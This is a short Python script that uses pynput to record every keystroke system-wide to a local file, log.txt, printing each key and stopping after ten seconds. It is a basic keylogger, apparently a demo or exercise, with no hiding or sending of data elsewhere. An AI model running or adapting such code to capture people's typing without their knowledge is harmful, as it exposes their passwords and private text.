import pynput, threading, time

global filename
global listenerHandler
filename = "log.txt"

def on_press(key):
    global filename
    print(str(key).strip("'"))
    file = open(filename, "a")
    strippedkey = str(key).strip("'")
    if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
        file.write("\n")
    file.write(str(key).strip("'"))
    if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
        file.write("\n")
    file.close()

def start_listening():
    global listenerHandler
    listenerHandler = pynput.keyboard.Listener(on_press =on_press)
    listenerHandler.start()
    try:
        listenerHandler.join()
    finally:
        listenerHandler.stop()

if __name__ == "__main__":
    t1 = threading.Thread(target=start_listening)
    t1.start()
    time.sleep(10)
    listenerHandler.stop()  
    t1.join()